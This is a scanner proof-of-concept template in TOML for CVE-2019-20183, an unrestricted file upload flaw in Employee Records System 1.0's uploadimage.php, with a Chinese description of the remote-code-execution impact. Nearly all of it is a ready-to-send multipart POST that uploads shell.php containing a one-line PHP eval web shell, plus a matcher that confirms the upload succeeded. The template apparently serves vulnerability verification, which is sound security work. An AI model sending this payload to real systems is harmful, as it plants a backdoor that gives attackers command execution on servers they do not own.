[info]
author = "ave"
description = "验证 Employee Records System 1.0 uploadimage.php 不安全文件上传漏洞，攻击者通过修改全局脚本 global.js 绕过客户端扩展名校验，上传恶意 PHP 文件实现远程代码执行"
id = "POC-AVE-2019-0154"
name = "CVE-2019-20183 PoC"
severity = "high"
tags = ["ave-2019-0154"]
vuln_id = [
    "CVE-2019-20183",
    "AVE-2019-0154",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/uploadimage.php"
protocol = "http"

[poc.requests.body]
content = '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php @eval($_POST["cmd"]); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["shell.php"]
